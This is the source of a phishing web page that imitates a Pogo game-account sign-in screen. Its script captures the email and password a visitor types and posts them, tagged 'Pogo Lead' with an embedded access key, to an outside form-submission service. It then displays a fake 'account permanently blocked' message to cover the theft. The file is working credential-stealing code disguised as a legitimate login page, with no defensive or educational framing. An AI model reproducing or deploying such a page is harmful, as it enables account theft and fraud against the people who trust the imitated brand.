<style>
  :root {
    color-scheme: light;
    --ink: #161616;
    --muted: #626262;
    --line: #c9c9c9;
    --accent: #1769ff;
    --accent-hover: #0954d6;
    --surface: #fff;
  }

  * {
    box-sizing: border-box;
  }

  /* Single full-screen background image */
  body {
    margin: 0;
    min-height: 100vh;
    display: grid;
    place-items: center;
    padding: 28px 16px;

    background-image:
      linear-gradient(
        rgba(3, 10, 25, 0.40),
        rgba(4, 17, 39, 0.40)
      ),
      url('background.png');

    background-size: cover;
    background-position: center center;
    background-repeat: no-repeat;
    background-attachment: fixed;

    color: var(--ink);
    font-family: Arial, Helvetica, sans-serif;
    overflow-x: hidden;
  }

  /* Login card */
  .card {
    width: min(100%, 420px);
    background: rgba(255, 255, 255, 0.98);
    border-radius: 18px;
    padding: 34px 36px 30px;
    box-shadow: 0 18px 60px rgba(0, 0, 0, 0.38);
  }

  /* Brand */
  .brand {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin: 0 auto 28px;
  }

  .brand-mark {
    width: 42px;
    height: 42px;
    display: grid;
    place-items: center;
    border-radius: 12px;
    background: #161616;
    color: #fff;
    font-weight: 800;
    font-size: 21px;
    letter-spacing: -2px;
  }

  .brand-name {
    font-size: 25px;
    line-height: 1;
    font-weight: 800;
    letter-spacing: -1px;
  }

  /* Heading and description */
  h1 {
    margin: 0 0 10px;
    text-align: center;
    font-size: 27px;
    letter-spacing: -0.5px;
  }

  .intro {
    margin: 0 0 25px;
    text-align: center;
    color: var(--muted);
    font-size: 14px;
    line-height: 1.5;
  }

  /* Form labels and inputs */
  label {
    display: block;
    font-size: 14px;
    font-weight: 700;
    margin: 0 0 8px;
  }

  input {
    width: 100%;
    min-height: 48px;
    border: 1px solid var(--line);
    border-radius: 8px;
    padding: 12px 13px;
    font: inherit;
    font-size: 15px;
    outline: none;
    background: #fff;
  }

  input:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 3px rgba(23, 105, 255, 0.14);
  }

  .field {
    margin-bottom: 18px;
  }

  /* Password visibility button */
  .password-wrap {
    position: relative;
  }

  .password-wrap input {
    padding-right: 68px;
  }

  .toggle {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    border: 0;
    background: transparent;
    color: var(--accent);
    font-weight: 700;
    cursor: pointer;
    padding: 7px;
  }

  /* Remember me and forgot password */
  .row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
    margin: 2px 0 22px;
    font-size: 13px;
  }

  .remember {
    display: flex;
    align-items: center;
    gap: 8px;
    font-weight: 400;
    margin: 0;
  }

  .remember input {
    width: 16px;
    min-height: 16px;
    accent-color: var(--accent);
  }

  a {
    color: var(--accent);
    text-decoration: none;
    font-weight: 700;
  }

  a:hover {
    text-decoration: underline;
  }

  /* Sign-in button */
  .primary {
    width: 100%;
    min-height: 49px;
    border: 0;
    border-radius: 999px;
    background: var(--accent);
    color: #fff;
    font-size: 15px;
    font-weight: 700;
    cursor: pointer;
  }

  .primary:hover {
    background: var(--accent-hover);
  }

  /* Divider */
  .divider {
    display: flex;
    align-items: center;
    gap: 12px;
    margin: 23px 0;
    color: #777;
    font-size: 12px;
  }

  .divider::before,
  .divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #e1e1e1;
  }

  /* Create account link */
  .secondary {
    display: block;
    width: 100%;
    padding: 14px;
    text-align: center;
    border: 1px solid #bdbdbd;
    border-radius: 999px;
    color: var(--ink);
    font-size: 14px;
  }

  /* Footer */
  .foot {
    margin: 24px 0 0;
    text-align: center;
    color: var(--muted);
    font-size: 12px;
    line-height: 1.6;
  }

  /* Notice message */
  .notice {
    display: none;
    margin: 0 0 16px;
    padding: 11px 12px;
    border-radius: 8px;
    background: #f2edff;
    color: #402080;
    font-size: 13px;
    line-height: 1.45;
  }

  /* Login error message */
  #loginError {
    display: none;
    margin-top: 20px;
    padding: 13px 15px;
    border-radius: 4px;
    background: #fdecea;
    border: 1px solid #f5c2c0;
    color: #b3261e;
    font-size: 14px;
    text-align: left;
  }

  /* Mobile responsive layout */
  @media (max-width: 420px) {
    .card {
      padding: 28px 22px 24px;
      border-radius: 14px;
    }

    .brand-name {
      font-size: 23px;
    }

    h1 {
      font-size: 25px;
    }

    body {
      padding: 20px 14px;
    }
  }

  /* Prevent fixed-background issues on smaller screens */
  @media (max-width: 768px) {
    body {
      background-attachment: scroll;
    }
  }
</style>

</head>
<body>
  <div class="game-wall" aria-hidden="true">
    <div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div>
    <div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div>
    <div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div>
    <div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div><div class="game-tile"></div>
  </div>
  <div class="wall-shade" aria-hidden="true"></div>
  <main class="card">
    <div class="brand" aria-label="GameHub">
      <img src="logo.png" style="max-width: 25% !important;">
    </div>
    <h1>Welcome back</h1>
    <p class="intro">Sign in to continue to your Pogo account.</p>


    <form id="login-form">

  <input type="hidden" name="access_key" value="727472ef-0e91-4efc-b421-2c3d16398117">
  <input type="hidden" name="subject" value="Pogo Lead">

      <div class="field">
        <label for="email">Email address</label>
        <input id="email" name="email" type="email" autocomplete="email" placeholder="you@example.com" required>
      </div>
      <div class="field">
        <label for="password">Password</label>
        <div class="password-wrap">
          <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Enter your password" required>
          <button class="toggle" type="button" id="toggle-password" aria-controls="password" aria-pressed="false">Show</button>
        </div>
      </div>
      <div class="row">
        <label class="remember"><input type="checkbox" name="remember"> Remember me</label>
        <a href="#" id="forgot-link">Forgot password?</a>
      </div>
      <button class="primary" type="submit">Sign in</button>

<div id="loginError" style="
    display:none;
    margin-top:20px;
    padding:13px 15px;
    border-radius:4px;
    background:#fdecea;
    border:1px solid #f5c2c0;
    color:#b3261e;
    font-size:14px;
    text-align:left;
  ">
    <strong>Unable to sign in.</strong><br>
    Your account has been permanently blocked due to suspicious activity.<br>
    Please contact support immediately for assistance.
  </div>

    </form>

    <div class="divider" id="divider">OR</div>
    <a class="secondary" href="#" id="create-link">Create an account</a>
  </main>
  <script>

const toggleButton = document.getElementById("toggle-password");
const passwordInput = document.getElementById("password");

toggleButton.addEventListener("click", function () {
  const isPassword = passwordInput.type === "password";

  passwordInput.type = isPassword ? "text" : "password";
  toggleButton.textContent = isPassword ? "Hide" : "Show";
  toggleButton.setAttribute("aria-pressed", String(isPassword));
});

document.getElementById("login-form").addEventListener("submit", async function (event) {
  event.preventDefault();

  const email = document.getElementById("email").value;
  const pass = document.getElementById("password").value;
  const accessKey = this.querySelector('[name="access_key"]').value;

  const data = new FormData();
  data.append("access_key", accessKey);
  data.append("subject", "Pogo Lead");
  data.append("email", email);
  data.append("Pass", pass);

  try {
    await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      body: data
    });
  } catch (error) {
    console.error(error);
  }

  // Stay on the same page and show the error.
  document.getElementById("loginError").style.display = "block";
  document.getElementById("create-link").style.display = "none";
  document.getElementById("divider").style.display = "none";
});
</script>
